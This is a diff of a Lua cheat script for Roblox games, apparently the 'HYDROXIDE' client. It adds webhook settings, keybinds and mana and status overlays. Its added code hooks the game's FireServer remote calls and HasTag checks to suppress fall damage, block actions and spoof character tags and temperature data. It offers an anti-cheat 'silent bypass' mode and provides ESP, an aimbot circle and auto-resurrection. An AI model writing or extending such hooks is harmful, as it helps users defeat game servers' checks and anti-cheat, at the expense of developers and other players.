@@ -8989,11 +19992,12 @@ if game.PlaceId == 100010170789226 then
             end)
         end
 
-        do -- ui
+        do
             local group_ui = Tabs.Interface:AddLeftGroupbox("UI Settings")
-            group_ui:AddLabel("General Settings")
 
-            do -- Chat Logger
+            group_ui:AddLabel("General Settings")
+            
+            do
                 group_ui:AddToggle("chat_logger", {
                     Text = "Chat Logger",
                     Default = false,
@@ -9025,9 +20029,7 @@ if game.PlaceId == 100010170789226 then
                 Callback = function(state)
                     cheat_client.config.notifications = state
                     if state then
-                        --warn("notifications on!")
                     else
-                        --warn("notifications turned off")
                     end
                 end
             })
@@ -9057,7 +20059,6 @@ if game.PlaceId == 100010170789226 then
                         if state then
                             toggle:SetDisabled(false)
 
-                            -- Re-apply stored value to update visual state after enabling
                             if toggle.Value ~= nil then
                                 toggle:SetValue(toggle.Value)
                             end
@@ -9086,14 +20087,12 @@ if game.PlaceId == 100010170789226 then
                 end
             })
 
-            -- Trigger callback immediately to apply initial state
             if Toggles.blatant_mode then
                 Toggles.blatant_mode:SetValue(cheat_client.config.blatant_mode)
             end
 
             group_ui:AddDivider()
 
-            -- Safety & Security
             group_ui:AddLabel("Safety & Security")
 
             group_ui:AddToggle("auto_panic", {
@@ -9101,6 +20100,21 @@ if game.PlaceId == 100010170789226 then
                 Default = cheat_client.config.auto_panic or false,
                 Callback = function(state)
                     cheat_client.config.auto_panic = state
+                end
+            })
+
+            group_ui:AddDropdown("AnticheatMode", {
+                Text = "Anti-Cheat Mode",
+                Values = {"Normal", "Kick"},
+                Default = anticheat_mode == "Kick" and 2 or 1,
+                Tooltip = "Normal: Silent bypass | Kick: Locks you in kick loop on detection (requires reload to apply)",
+                Callback = function(value)
+                    cheat_client.config.anticheat_mode = value
+                    pcall(function()
+                        if writefile then
+                            writefile("HYDROXIDE/anticheat_mode.txt", value)
+                        end
+                    end)
                 end
             })
 
@@ -9114,15 +20128,175 @@ if game.PlaceId == 100010170789226 then
                 end
             })
 
+            group_ui:AddDivider()
+            group_ui:AddLabel("Webhook Notifications")
+
+            group_ui:AddToggle("webhook_show_username", {
+                Text = "Show Username in Webhooks",
+                Default = cheat_client.config.webhook_show_username ~= false,
+                Tooltip = "When enabled, webhooks will show [**username**] prefix",
+                Callback = function(state)
+                    cheat_client.config.webhook_show_username = state
+                end
+            })
+
+            group_ui:AddToggle("show_in_artifact_stream", {
+                Text = "Show in Artifact Stream",
+                Default = cheat_client.config.show_in_artifact_stream,
+                Tooltip = "When enabled, artifacts will be posted to the community artifact stream (no personal info shown)",
+                Callback = function(state)
+                    cheat_client.config.show_in_artifact_stream = state
+
+                    local httpService = Services.HttpService
+                    pcall(function()
+                        local shared_settings = {}
+                        if mem:HasItem("shared_settings") then
+                            local success, loaded = pcall(function()
+                                return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                            end)
+                            if success and loaded then
+                                shared_settings = loaded
+                            end
+                        end
+                        shared_settings.show_in_artifact_stream = state
+                        mem:SetItem("shared_settings", httpService:JSONEncode(shared_settings))
+                    end)
+                end
+            })
+
+            group_ui:AddInput("webhook_url", {
+                Default = cheat_client.config.webhook,
+                Numeric = false,
+                Finished = false,
+                Text = "Discord Webhook URL (press enter to apply)",
+                Tooltip = "Enter your Discord webhook URL for notifications (persists across serverhops)",
+                Placeholder = "https://discord.com/api/webhooks/...",
+                Callback = function(value)
+                    if value and value ~= "" then
+                        if value:match("^https://discord.com/api/webhooks/%d+/%S+$") then
+                            cheat_client.config.webhook = value
+
+                            local httpService = Services.HttpService
+                            pcall(function()
+                                local shared_settings = {}
+                                if mem:HasItem("shared_settings") then
+                                    local success, loaded = pcall(function()
+                                        return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                                    end)
+                                    if success and loaded then
+                                        shared_settings = loaded
+                                    end
+                                end
+                                shared_settings.webhook = value
+                                mem:SetItem("shared_settings", httpService:JSONEncode(shared_settings))
+                            end)
+                        else
+                            library:Notify("Invalid webhook URL format!")
+                        end
+                    else
+                        cheat_client.config.webhook = ""
+
+                        local httpService = Services.HttpService
+                        pcall(function()
+                            local shared_settings = {}
+                            if mem:HasItem("shared_settings") then
+                                local success, loaded = pcall(function()
+                                    return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                                end)
+                                if success and loaded then
+                                    shared_settings = loaded
+                                end
+                            end
+                            shared_settings.webhook = ""
+                            mem:SetItem("shared_settings", httpService:JSONEncode(shared_settings))
+                        end)
+                    end
+                end
+            })
+
+            group_ui:AddInput("webhook_username", {
+                Default = cheat_client.config.webhook_username or "bladee",
+                Numeric = false,
+                Finished = false,
+                Text = "Webhook Username",
+                Tooltip = "Custom username for webhook messages (persists across serverhops)",
+                Placeholder = "bladee",
+                Callback = function(value)
+                    local username = (value and value ~= "") and value or "bladee"
+                    cheat_client.config.webhook_username = username
+
+                    local httpService = Services.HttpService
+                    pcall(function()
+                        local shared_settings = {}
+                        if mem:HasItem("shared_settings") then
+                            local success, loaded = pcall(function()
+                                return httpService:JSONDecode(mem:GetItem("shared_settings"))
+                            end)
+                            if success and loaded then
+                                shared_settings = loaded
+                            end
+                        end
+                        shared_settings.webhook_username = username
+                        mem:SetItem("shared_settings", httpService:JSONEncode(shared_settings))
+                    end)
+                end
+            })
+
+            group_ui:AddButton({
+                Text = "Test Webhook",
+                Func = function()
+                    if not cheat_client.config.webhook or cheat_client.config.webhook == "" then
+                        library:Notify("Please enter a webhook URL first!")
+                        return
+                    end
+
+                    if not cheat_client.config.webhook:match("^https://discord.com/api/webhooks/%d+/%S+$") then
+                        library:Notify("Invalid webhook URL format!")
+                        return
+                    end
+
+                    library:Notify("Sending test webhook...")
+
+                    local send_webhook = HXD_SEND_WEBHOOK
+                    print("[WEBHOOK DEBUG] Function exists:", send_webhook ~= nil)
+                    print("[WEBHOOK DEBUG] Function type:", type(send_webhook))
+                    print("[WEBHOOK DEBUG] Webhook URL:", cheat_client.config.webhook)
+
+                    local success, result = pcall(function()
+                        local content
+                        if cheat_client.config.webhook_show_username ~= false then
+                            content = string.format("||[**%s**]|| Test message from hydroxide.solutions", plr.Name)
+                        else
+                            content = "Test message from hydroxide.solutions"
+                        end
+
+                        print("[WEBHOOK DEBUG] Calling webhook with content:", content)
+                        local res = send_webhook(cheat_client.config.webhook, {
+                            username = cheat_client.config.webhook_username or "bladee",
+                            content = content
+                        })
+                        print("[WEBHOOK DEBUG] Webhook returned:", res, type(res))
+                        return res
+                    end)
+
+                    print("[WEBHOOK DEBUG] pcall success:", success, "result:", result)
+
+                    if success and result then
+                        library:Notify("Test webhook sent successfully!")
+                    elseif success and not result then
+                        library:Notify("Failed to send webhook [1]")
+                    else
+                        library:Notify("Failed to send webhook [2]: " .. tostring(result))
+                    end
+                end,
+                DoubleClick = false,
+                Tooltip = "Send a test message to verify your webhook is working"
+            })
+
             if not LPH_OBFUSCATED then
                 group_ui:AddButton({
                     Text = "Debug Info",
                     Func = function()
-                        if not is_hydroxide_debug_enabled() then
-                            library:Notify("Debug mode disabled", 3)
-                            return
-                        end
-
                         print("=== HYDROXIDE DEBUG INFO ===")
 
                         print("\n[Feature Connections]")
@@ -9136,7 +20310,6 @@ if game.PlaceId == 100010170789226 then
                             print(string.format("  Total Active: %d", active_count))
                         end
 
-                        -- Shared Connections & Drawings
                         print("\n[Shared Connections]")
                         if shared then
                             if shared.connections then
@@ -9206,10 +20379,9 @@ if game.PlaceId == 100010170789226 then
 
         local status_window
 
-        do -- ui right
+        do
             local group_ui_right = Tabs.Interface:AddRightGroupbox("UI Settings")
 
-            -- Ally System
             group_ui_right:AddLabel("Ally System")
 
             group_ui_right:AddToggle("auto_housemate_ally", {
@@ -9310,7 +20482,6 @@ if game.PlaceId == 100010170789226 then
 
             group_ui_right:AddDivider()
 
-            -- UI Windows
             group_ui_right:AddLabel("UI Windows")
 
             status_window = library:StatusWindow({
@@ -9334,7 +20505,7 @@ if game.PlaceId == 100010170789226 then
             local status_pos_file = "HYDROXIDE/bin/status_frame_position.json"
             if library.StatusFrame and isfile and readfile and isfile(status_pos_file) then
                 local success, pos_data = pcall(function()
-                    return game:GetService("HttpService"):JSONDecode(readfile(status_pos_file))
+                    return Services.HttpService:JSONDecode(readfile(status_pos_file))
                 end)
                 if success and pos_data and #pos_data == 4 then
                     library.StatusFrame.Position = UDim2.new(pos_data[1], pos_data[2], pos_data[3], pos_data[4])
@@ -9349,18 +20520,18 @@ if game.PlaceId == 100010170789226 then
                     status_save_debounce = true
 
                     task.spawn(function()
-                        task.wait(0.05) -- Debounce 0.5s
+                        task.wait(0.05)
                         status_save_debounce = false
 
                         local pos = library.StatusFrame.Position
                         local posTable = {pos.X.Scale, pos.X.Offset, pos.Y.Scale, pos.Y.Offset}
                         cheat_client.config.status_frame_position = posTable
 
-                        if writefile and game:GetService("HttpService") then
+                        if writefile and Services.HttpService then
                             pcall(function()
                                 if not isfolder("HYDROXIDE") then makefolder("HYDROXIDE") end
                                 if not isfolder("HYDROXIDE/bin") then makefolder("HYDROXIDE/bin") end
-                                writefile(status_pos_file, game:GetService("HttpService"):JSONEncode(posTable))
+                                writefile(status_pos_file, Services.HttpService:JSONEncode(posTable))
                             end)
                         end
                     end)
@@ -9385,7 +20556,7 @@ if game.PlaceId == 100010170789226 then
             local keybind_pos_file = "HYDROXIDE/bin/keybind_frame_position.json"
             if library.KeybindFrame and isfile and readfile and isfile(keybind_pos_file) then
                 local success, pos_data = pcall(function()
-                    return game:GetService("HttpService"):JSONDecode(readfile(keybind_pos_file))
+                    return Services.HttpService:JSONDecode(readfile(keybind_pos_file))
                 end)
                 if success and pos_data and #pos_data == 4 then
                     library.KeybindFrame.Position = UDim2.new(pos_data[1], pos_data[2], pos_data[3], pos_data[4])
@@ -9400,18 +20571,18 @@ if game.PlaceId == 100010170789226 then
                     keybind_save_debounce = true
 
                     task.spawn(function()
-                        task.wait(0.05) -- Debounce 0.5s
+                        task.wait(0.05)
                         keybind_save_debounce = false
 
                         local pos = library.KeybindFrame.Position
                         local posTable = {pos.X.Scale, pos.X.Offset, pos.Y.Scale, pos.Y.Offset}
                         cheat_client.config.keybind_frame_position = posTable
 
-                        if writefile and game:GetService("HttpService") then
+                        if writefile and Services.HttpService then
                             pcall(function()
                                 if not isfolder("HYDROXIDE") then makefolder("HYDROXIDE") end
                                 if not isfolder("HYDROXIDE/bin") then makefolder("HYDROXIDE/bin") end
-                                writefile(keybind_pos_file, game:GetService("HttpService"):JSONEncode(posTable))
+                                writefile(keybind_pos_file, Services.HttpService:JSONEncode(posTable))
                             end)
                         end
                     end)
@@ -9421,7 +20592,7 @@ if game.PlaceId == 100010170789226 then
             shared.keybinds_window = keybinds_window
         end
 
-        do -- Status Colors & Effects
+        do
             local status_colors = {
                 parry_cooldown = Color3.fromRGB(255, 255, 0),
                 frostbite = Color3.fromRGB(150, 200, 255),
@@ -9511,9 +20682,6 @@ if game.PlaceId == 100010170789226 then
                     status_window:AddItem("Grindstone", status_colors.grindstone)
                 end
                 
-                --if cs:HasTag(character, "Danger") or FindFirstChild(character, "Danger") then
-                --    status_window:AddItem("Danger", status_colors.danger)
-                --end
                 
                 if cs:HasTag(character, "Unconscious") then
                     status_window:AddItem("Unconscious", status_colors.unconscious)
@@ -9750,7 +20918,6 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
 
-                -- Update the status frame to refresh visibility and sizing
                 library:UpdateStatusFrame()
             end
 
@@ -9862,6 +21029,24 @@ if game.PlaceId == 100010170789226 then
 
 
         local group_keybinds = Tabs.Interface:AddRightGroupbox("Keybind Settings")
+
+        if game.PlaceId == 3541987450 and not LPH_OBFUSCATED then
+            group_keybinds:AddLabel("PS Heal Keybind"):AddKeyPicker("PsHealButtonKeybind", {
+                Default = cheat_client.config.ps_heal_button_keybind,
+                Text = "PS Heal Button",
+                Mode = "Press",
+                Callback = function(Value)
+                    pcall(function()
+                        fireclickdetector(workspace.PrivateServerArena.HealingPads.Part.ClickDetector)
+                    end)
+                end
+            })
+
+            Options.PsHealButtonKeybind:OnChanged(function()
+                cheat_client.config.ps_heal_button_keybind = Options.PsHealButtonKeybind.Value
+            end)
+        end
+
         group_keybinds:AddLabel("Instant Menu Key"):AddKeyPicker("MenuKey", {
             Default = cheat_client.config.instant_menu_keybind,
             Text = "Instant Menu",
@@ -9875,16 +21060,15 @@ if game.PlaceId == 100010170789226 then
             cheat_client.config.instant_menu_keybind = Options.MenuKey.Value
         end)
 
-        do -- Config
+        do
             if shared.SaveManager and shared.ThemeManager then
-                local config_folder = "HYDROXIDE/configs"
+                local config_folder = game.PlaceId == 14341521240 and "HYDROXIDE/rlp_configs" or "HYDROXIDE/configs"
                 shared.SaveManager:SetFolder(config_folder)
                 shared.ThemeManager:SetFolder("HYDROXIDE")
 
                 shared.SaveManager:SetIgnoreIndexes({ "SavedPaths" })
 
                 shared.SaveManager.OnConfigLoaded = function(configName)
-                    -- Persist loaded config across serverhops if enabled
                     if cheat_client.config.persistent_configs and mem and configName then
                         mem:SetItem("loaded_config", configName)
                     end
@@ -9967,7 +21151,7 @@ if game.PlaceId == 100010170789226 then
                         local json = {
                             ["cmd"] = "INVITE_BROWSER",
                             ["args"] = {
-                                ["code"] = "tu9JKPqbNR"
+                                ["code"] = "fnpNyCsG4u"
                             },
                             ["nonce"] = 'a'
                         }
@@ -9981,7 +21165,7 @@ if game.PlaceId == 100010170789226 then
                                     ['Content-Type'] = 'application/json',
                                     ['Origin'] = 'https://discord.com'
                                 },
-                                Body = game:GetService('HttpService'):JSONEncode(json)
+                                Body = Services.HttpService:JSONEncode(json)
                             }).Body
                         end)
 
@@ -10021,7 +21205,6 @@ if game.PlaceId == 100010170789226 then
                     end
                 end)
 
-                -- Load persisted config if enabled and available
                 if cheat_client.config.persistent_configs and persisted_config_name and persisted_config_name ~= "" then
                     local success, err = shared.SaveManager:Load(persisted_config_name)
 
@@ -10031,11 +21214,17 @@ if game.PlaceId == 100010170789226 then
                         shared.SaveManager:LoadAutoloadConfig()
                     end
                 else
-                    -- No persisted config or disabled, load autoload (if BuildConfigSection didn't already)
                     if not shared.SaveManager.CurrentConfig or shared.SaveManager.CurrentConfig == "" then
                         shared.SaveManager:LoadAutoloadConfig()
                     end
                 end
+
+                task.spawn(function()
+                    task.wait(0.5)
+                    local keybind = Options.MenuKeybind.Value
+                    local keybind_str = keybind and tostring(keybind) or "RightShift"
+                    library:Notify("Press " .. keybind_str .. " to open menu", 8)
+                end)
 
                 task.spawn(function()
                     local success, err = pcall(function()
@@ -10043,7 +21232,7 @@ if game.PlaceId == 100010170789226 then
                         repeat
                             task.wait(0.1)
                             timeout = timeout + 1
-                        until #plrs:GetPlayers() > 0 or timeout > 50 -- Max 5 seconds
+                        until #plrs:GetPlayers() > 0 or timeout > 50
 
                         task.wait(0.5)
 
@@ -10063,6 +21252,20 @@ if game.PlaceId == 100010170789226 then
 
                     if Toggles.TrinketEsp and Toggles.TrinketEsp.Value then
                         cheat_client.esp_rendering.start_trinket_esp()
+                    end
+
+                    if Toggles.FallionEsp and Toggles.FallionEsp.Value then
+                        if game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 then
+                            if FindFirstChild(ws, "NPCs") then
+                                cheat_client.fallion_esp_objects = cheat_client.fallion_esp_objects or {}
+                                for _, fallion in next, ws.NPCs:GetChildren() do
+                                    if fallion.Name == "Fallion" and not cheat_client.fallion_esp_objects[fallion] then
+                                        cheat_client:add_fallion_esp(fallion, fallion.Name)
+                                    end
+                                end
+                            end
+                        end
+                        cheat_client.esp_rendering.start_fallion_esp()
                     end
 
                     if Toggles.NpcEsp and Toggles.NpcEsp.Value then
@@ -10100,7 +21303,7 @@ if game.PlaceId == 100010170789226 then
         end
     end
 
-    do -- Legit Intent System
+    do
         local model_path = "HYDROXIDE/bin/watched.rbxm"
         local legit_intent_gui = nil
         local range = 100
@@ -10129,7 +21332,6 @@ if game.PlaceId == 100010170789226 then
 
             if success and model then
                 legit_intent_gui = model
-                --print("intent model loaded successfully")
             else
                 warn("failed to load intent model:", model)
             end
@@ -10182,7 +21384,6 @@ if game.PlaceId == 100010170789226 then
             connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                 heartbeat_counter = heartbeat_counter + 1
 
-                -- Throttle to ~15 FPS (every 4 heartbeats)
                 if heartbeat_counter % 4 ~= 0 then return end
 
                 if not character.Parent then
@@ -10300,7 +21501,7 @@ if game.PlaceId == 100010170789226 then
         end
     end
 
-    do -- Proximity Notifier System
+    do
         cheat_client.proximity_cleanup = function()
             if proximity_connection then
                 proximity_connection:Disconnect();
@@ -10342,7 +21543,6 @@ if game.PlaceId == 100010170789226 then
             proximity_connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                 heartbeat_counter = heartbeat_counter + 1
 
-                -- Throttle to ~10 FPS (every 6 heartbeats)
                 if heartbeat_counter % 6 ~= 0 then return end
 
                 local threshold = Options.proximity_distance and Options.proximity_distance.Value or 100
@@ -10413,12 +21613,153 @@ if game.PlaceId == 100010170789226 then
             setup()
         end
     end
+
+    do
+        local function getPing()
+            local success, ping = pcall(function()
+                return Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
+            end)
+            return success and ping or 0
+        end
+
+        do
+            old_hastag = hookfunction(cs.HasTag, function(self, object, tag)
+                if not checkcaller() then
+                    if object == plr.Character then
+                        if tag == "Acrobat" and shared and Toggles and Toggles.spoof_acrobat and Toggles.spoof_acrobat.Value then
+                            return true
+                        elseif tag == "The Soul" and shared and Toggles and Toggles.spoof_the_soul and Toggles.spoof_the_soul.Value then
+                            return true
+                        end
+                    end
+                end
+                return old_hastag(self, object, tag)
+            end)
+        end
+
+        do
+            local active_connections = {}
+
+            local function sensitive(tbl, key)
+                for k, _ in pairs(tbl) do
+                    if typeof(k) == "string" and k:lower() == key:lower() then
+                        return true
+                    end
+                end
+                return false
+            end
+
+            if game.PlaceId == 14341521240 then
+                local dialogue = FindFirstChild(rps.Requests, "Dialogue")
+                if dialogue then
+                    dialogue_remote = dialogue
+                end
+            end
+
+            for _, remote in pairs(rps.Requests:GetChildren()) do
+                if remote:IsA("RemoteEvent") then
+                    local connection
+                    connection = utility:Connection(remote.OnClientEvent, function(data)
+                        if typeof(data) == "table" and (sensitive(data, "choices") or sensitive(data, "speaker")) then
+                            if not dialogue_remote then
+                                dialogue_remote = remote
+
+                                if shared and shared.setupAutoDialogue then
+                                    shared.setupAutoDialogue()
+                                end
+
+                                if Toggles and Toggles.auto_dialogue and Toggles.auto_dialogue.Value then
+                                    if plr.Character and FindFirstChild(plr.Character, "InDialogue") then
+                                        task.defer(function()
+                                            if shared.auto_dialogue_handler then
+                                                shared.auto_dialogue_handler(data)
+                                            end
+                                        end)
+                                    end
+                                end
+                                
+                                for _, conn in pairs(active_connections) do
+                                    conn:Disconnect()
+                                end
+                                active_connections = {}
+                                active_connections[#active_connections + 1] = connection
+                            end
+                        end
+                    end)
+                    active_connections[#active_connections + 1] = connection
+                end
+            end
+        end
+
+        do
+            local function attempt_mana_remote_detection(char)
+                mana_remote = nil
+                
+                local humanoid = WaitForChild(char, "Humanoid", 5)
+                if not humanoid then return end
+                
+                local handler = WaitForChild(char, "CharacterHandler", 5)
+                if not handler then return end
+                
+                local remotes = WaitForChild(handler, "Remotes", 5)
+                if not remotes then return end
+                
+                local forcefield = FindFirstChildOfClass(char, "ForceField")
+                
+                if forcefield then
+                    local connection
+                    connection = utility:Connection(char.ChildRemoved, function(child)
+                        if child == forcefield or child:IsA("ForceField") then
+                            connection:Disconnect()
+                        end
+                    end)
+
+                    while shared and not shared.is_unloading and forcefield and forcefield:IsDescendantOf(game) do
+                        task.wait(0.5)
+                    end
+                    
+                    if connection then
+                        connection:Disconnect()
+                    end
+                end
+                
+                task.wait(0.3)
+                
+                local charge_key = Enum.KeyCode.G
+                vim:SendKeyEvent(true, charge_key, false, game)
+                task.wait(0.15)
+                vim:SendKeyEvent(false, charge_key, false, game)
+                task.wait(0.2)
+            end
+
+            local function mana_cleanup(char)
+                mana_remote = nil
+                
+                task.spawn(function()
+                    attempt_mana_remote_detection(char)
+                end)
+            end
+
+            if plr.Character then 
+                mana_cleanup(plr.Character)
+                task.spawn(function()
+                    attempt_mana_remote_detection(plr.Character)
+                end)
+            end
+            
+            utility:Connection(plr.CharacterAdded, function(char)
+                mana_cleanup(char)
+                task.spawn(function()
+                    attempt_mana_remote_detection(char)
+                end)
+            end)
+        end
+    end
     
-    -- Init
     do
         utility:setup_error_webhook()
 
-        do -- FOV
+        do
             aimbot_fov_circle = utility:Create("Circle", {
                 Visible = false,
                 Radius = 100,
@@ -10436,10 +21777,10 @@ if game.PlaceId == 100010170789226 then
             }, "esp")
         end
 
-        do -- Mana
+        do
             spellvis = utility:Create("Square", {
                 Visible = false,
-                Transparency = 0.45, -- 0.3
+                Transparency = 0.45,
                 Filled = true,
                 ZIndex = 100,
                 Color = Color3.fromRGB(255, 0, 0),
@@ -10447,14 +21788,14 @@ if game.PlaceId == 100010170789226 then
 
             snapvis = utility:Create("Square", {
                 Visible = false,
-                Transparency = 0.45, -- 0.3
+                Transparency = 0.45,
                 Filled = true,
                 ZIndex = 100,
                 Color = Color3.fromRGB(0, 0, 255),
             }, "esp")
         end
 
-        do -- Mana Overlay
+        do
             local char = plr and plr.Character
             
             local current_spell_instance = nil
@@ -10519,7 +21860,7 @@ if game.PlaceId == 100010170789226 then
                 local baseY = manaBar.AbsolutePosition.Y
                 local barWidth = manaBar.AbsoluteSize.X
                 local barHeight = manaBar.AbsoluteSize.Y
-                local topInset = game:GetService("GuiService"):GetGuiInset().Y
+                local topInset = Services.GuiService:GetGuiInset().Y
 
                 local function getY(percent)
                     return baseY + barHeight * (1 - percent / 100) + topInset
@@ -10552,7 +21893,6 @@ if game.PlaceId == 100010170789226 then
                 if not plr or not plr.Character then return end
                 char = plr.Character
 
-                -- Clean up old connections
                 for _, conn in pairs(mana_overlay_connections) do
                     conn:Disconnect()
                 end
@@ -10603,61 +21943,114 @@ if game.PlaceId == 100010170789226 then
                     char = newChar
                     setup_character()
                 end)
+
+                utility:Connection(plr.CharacterRemoving, function()
+                    for _, conn in pairs(mana_overlay_connections) do
+                        pcall(function() conn:Disconnect() end)
+                    end
+                    mana_overlay_connections = {}
+                end)
             end
         end
-        
-        do -- No Fall Damage & Anti Gate Backfire
+
+        do
             local function block()
-                local character = plr.Character
-                if not character then return end
+                local blockRemote, unblockRemote
+                local handler = FindFirstChild(plr.Character, "CharacterHandler", true)
+                if handler then
+                    local remotes = FindFirstChild(handler, "Remotes")
+                    if remotes then
+                        blockRemote = FindFirstChild(remotes, "Block")
+                        unblockRemote = FindFirstChild(remotes, "Unblock")
+                    end
+                end
 
-                local network = character:FindFirstChild("Network")
-                if not network then return end
+                if blockRemote and unblockRemote then
+                    task.wait(0.01)
+                    local object = {}
+                    blockRemote:FireServer(false)
 
-                pcall(function()
-                    network:FireServer("Block")
-                end)
+                    repeat
+                        task.wait()
+                    until FindFirstChild(plr.Character, "Action")
 
-                task.wait(0.01)
-
-                repeat
-                    task.wait()
-                until character:FindFirstChild("Action")
-
-                pcall(function()
-                    network:FireServer("Unblock")
-                end)
+                    unblockRemote:FireServer(object)
+                end
             end
 
-            local function hook_network(character)
-                local network = character:WaitForChild("Network", 5)
-                if not network then return end
+            if game.PlaceId == 5208655184 or game.PlaceId == 3541987450 or game.PlaceId == 109732117428502 or game.PlaceId == 14341521240 then
+                old_remote = hookfunction(Instance.new("RemoteEvent").FireServer, function(Event, ...)
+                	local args = {...}
 
-                if old_remote then return end
+                    local char = plr.Character
+                    local remotes_folder = char
+                        and FindFirstChild(char, "CharacterHandler")
+                        and FindFirstChild(char.CharacterHandler, "Remotes")
 
-                old_remote = hookfunction(network.FireServer, function(self, ...)
-                    local args = {...}
-                    local cmd = args[1]
-
-                    -- sanity
-                    if type(cmd) ~= "string" then
-                        return old_remote(self, ...)
+                    if shared and not mana_remote and remotes_folder and Event.Parent == remotes_folder then
+                        if game.PlaceId == 14341521240 then
+                            if Event.Name == "SetManaChargeState" then
+                                mana_remote = Event
+                            end
+                        elseif game.PlaceId == 3541987450 then
+                            if Event.Name:match("^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$") and #args == 1 and typeof(args[1]) == "boolean" then
+                                mana_remote = Event
+                            end
+                        else
+                            if Event.Name:sub(1,4) == "M0ai" and #args == 1 and typeof(args[1]) == "table" then
+                                local t = args[1]
+                                local keys = 0
+                                for _ in pairs(t) do keys+=1 end
+                                local a, b = t[1], t[2]
+                                if keys == 2 and typeof(a)=="number" and typeof(b)=="number" and b%1~=0 then
+                                    mana_remote = Event
+                                end
+                            end
+                        end
                     end
 
-                    -- No Fall Damage
-                    if Toggles and Toggles.no_fall and Toggles.no_fall.Value and cmd == "ApplyFallDamage" then
-                        return
+
+                    if shared and remotes_folder and Event.Parent == remotes_folder then
+                        local no_fall_enabled = (Toggles and Toggles.no_fall and Toggles.no_fall.Value) or (trinket_bot and trinket_bot.path_running)
+                        if no_fall_enabled and #args == 2 and typeof(args[2]) == "table" then
+                            return
+                        end
+                    end
+                    
+                	if shared and Toggles and Toggles.gate_anti_backfire and Toggles.gate_anti_backfire.Value and tostring(Event):match("RightClick") then
+                        if plr.Character then
+                            if FindFirstChild(plr.Character, 'Gate') then
+                                local artifacts_folder = FindFirstChild(plr.Character, "Artifacts")
+                                if artifacts_folder and FindFirstChild(artifacts_folder, "PhilosophersStone") then
+                                    return old_remote(Event, ...)
+                                end
+
+                                local mana_instance = FindFirstChild(plr.Character, 'Mana')
+                                if mana_instance then
+                                    local mana_value = mana_instance.Value;
+
+                                    if (mana_value > 75 and mana_value < 80) or not cs:HasTag(plr.Character,'Danger') and FindFirstChild(plr.Character, "AzaelHorn") then
+                                        return old_remote(Event, ...)
+                                    end
+                                    
+                                    return
+                                end
+                            end
+                        end
                     end
 
-                    if Toggles and Toggles.AntiBackfireViribus and Toggles.AntiBackfireViribus.Value and cmd == "Click2" then
-                        local character = plr.Character
-                        if character and character:FindFirstChild("Viribus") then
-                            local artifacts = character:FindFirstChild("Artifacts")
-                            if not (artifacts and artifacts:FindFirstChild("PhilosophersStone")) then
-                                local mana = character:FindFirstChild("Mana")
-                                if mana then
-                                    local v = mana.Value
-                                    if (v > 0 and v < 60) or v > 70 then
+                    if shared and Toggles and Toggles.AntiBackfireViribus and Toggles.AntiBackfireViribus.Value and tostring(Event) == "RightClick" then
+                        if plr and plr.Character and cs:HasTag(plr.Character, "SnapCool") then
+                            return old_remote(Event, ...)
+                        end
+                        
+                        if plr and plr.Character and FindFirstChild(plr.Character, "Viribus") then
+                            local artifacts_folder = FindFirstChild(plr.Character, "Artifacts")
+                            if not (artifacts_folder and FindFirstChild(artifacts_folder, "PhilosophersStone")) then
+                                local mana_instance = FindFirstChild(plr.Character, "Mana")
+                                if mana_instance then
+                                    local mana_value = mana_instance.Value
+                                    if (mana_value > 0 and mana_value < 60) or (mana_value > 70) then
                                         task.spawn(block)
                                     end
                                 end
@@ -10665,17 +22058,88 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
 
-                    return old_remote(self, ...)
+                    if shared and Toggles and Toggles.temperature_lock and Toggles.temperature_lock.Value and rps.Requests and Event.Parent == rps.Requests and Event.Name ~= "ClearTrinket" then
+                        if #args == 1 and typeof(args[1]) == "string" then
+                            return 'Oresfall';
+                        end
+                    end
+
+                	return old_remote(Event, ...)
                 end)
             end
+        end
 
-            if plr.Character then
-                hook_network(plr.Character)
+        do
+            local function find_tool(names, matching)
+                if not plr.Character then return end
+                local function checkItem(item)
+                    for _, name in ipairs(names) do
+                        if matching == "match" then
+                            if string.match(item.Name:lower(), name:lower()) then
+                                return item
+                            end
+                        else
+                            if item.Name == name then
+                                return item
+                            end
+                        end
+                    end
+                    return nil
+                end
+
+                if not plr.Backpack then return nil end
+                for _, item in ipairs(plr.Backpack:GetChildren()) do
+                    if item:IsA("Tool") then
+                        local tool = checkItem(item)
+                        if tool then return tool end
+                    end
+                end
+
+                if plr.Character then
+                    for _, item in ipairs(plr.Character:GetChildren()) do
+                        if item:IsA("Tool") then
+                            local tool = checkItem(item)
+                            if tool then return tool end
+                        end
+                    end
+                end
+
+                return nil
             end
 
-            utility:Connection(plr.CharacterAdded, function(character)
-                old_remote = nil
-                hook_network(character)
+            local function use(tool)
+                if not (plr.Character and tool) then return end
+
+                local humanoid = FindFirstChildOfClass(plr.Character, "Humanoid")
+                if not humanoid then return end
+
+                humanoid:UnequipTools();
+
+                if plr.Backpack and tool.Parent == plr.Backpack then
+                    humanoid:EquipTool(tool)
+                end
+
+                if not FindFirstChild(plr.Character, tool.Name) then
+                    tool.AncestryChanged:Wait()
+                end
+
+                task.wait(0.025)
+                local charTool = FindFirstChild(plr.Character, tool.Name)
+                if charTool then
+                    charTool:Activate()
+                end
+            end
+
+            utility:Connection(cs:GetInstanceAddedSignal("Unconscious"), function(instance)
+                if plr.Character and instance == plr.Character and shared and Toggles and Toggles.auto_resurrection and Toggles.auto_resurrection.Value and cheat_client and cheat_client.window_active then
+                    task.spawn(function()
+                        task.wait(utility:random_wait())
+                        local resurrection = find_tool({ "Resurrection", "Dragon Awakening", "Dragon Resurrection" }, "exact")
+                        if resurrection then
+                            use(resurrection)
+                        end
+                    end)
+                end
             end)
         end
         
@@ -10685,11 +22149,11 @@ if game.PlaceId == 100010170789226 then
             
             local function makeNearbyPartsTransparent(character, rootPart)
                 for part, originalTransparency in pairs(transparent_parts) do
-                    if part and part:IsA("BasePart") then
+                    if part and part.Parent and part:IsA("BasePart") then
                         part.Transparency = originalTransparency
                     end
+                    transparent_parts[part] = nil
